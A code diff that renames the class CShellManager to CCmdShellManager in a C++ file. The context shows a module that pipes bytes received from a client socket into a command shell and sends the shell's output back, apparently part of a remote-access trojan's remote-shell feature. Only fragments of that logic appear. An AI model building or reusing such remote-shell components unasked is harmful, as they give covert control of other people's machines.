@@ -1,4 +1,4 @@
-// ShellManager.cpp: implementation of the CShellManager class.
+// ShellManager.cpp: implementation of the CCmdShellManager class.
 //
 ////////////////////////////////////////////////////////////////////////
 
@@ -9,7 +9,7 @@
 // Construction/Destruction
 ////////////////////////////////////////////////////////////////////////
 
-CShellManager::CShellManager(CClientSocket *pClient) : CManager(pClient)
+CCmdShellManager::CCmdShellManager(CClientSocket *pClient) : CManager(pClient)
 {
 	m_hReadPipeDll = NULL;
 	m_hWritePipeDll = NULL;
@@ -86,7 +86,7 @@ CShellManager::CShellManager(CClientSocket *pClient) : CManager(pClient)
 	m_hThreadMonitor = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)MonitorThread, this, 0, NULL);
 }
 
-CShellManager::~CShellManager()
+CCmdShellManager::~CCmdShellManager()
 {
 	m_bIsRunning = FALSE;
 
@@ -123,7 +123,7 @@ CShellManager::~CShellManager()
 	}
 }
 
-void CShellManager::OnReceive(LPBYTE lpBuffer, UINT nSize)
+void CCmdShellManager::OnReceive(LPBYTE lpBuffer, UINT nSize)
 {
 	if (nSize == 1 && lpBuffer[0] == COMMAND_NEXT)
 	{
@@ -138,9 +138,9 @@ void CShellManager::OnReceive(LPBYTE lpBuffer, UINT nSize)
 	WriteFile(m_hWritePipeDll, lpBuffer, nSize, &dwBytesWrite, NULL);
 }
 
-DWORD WINAPI CShellManager::ReadPipeThread(LPVOID lparam)
+DWORD WINAPI CCmdShellManager::ReadPipeThread(LPVOID lparam)
 {
-	CShellManager *pThis = (CShellManager *)lparam;
+	CCmdShellManager *pThis = (CCmdShellManager *)lparam;
 	CHAR szBuffer[4096];
 	DWORD dwBytesRead = 0;
 	DWORD dwTotalAvail = 0;
@@ -172,9 +172,9 @@ DWORD WINAPI CShellManager::ReadPipeThread(LPVOID lparam)
 	return 0;
 }
 
-DWORD WINAPI CShellManager::MonitorThread(LPVOID lparam)
+DWORD WINAPI CCmdShellManager::MonitorThread(LPVOID lparam)
 {
-	CShellManager *pThis = (CShellManager *)lparam;
+	CCmdShellManager *pThis = (CCmdShellManager *)lparam;
 	HANDLE hWait[2];
 	hWait[0] = pThis->m_hProcess;
 	hWait[1] = pThis->m_hThreadRead;
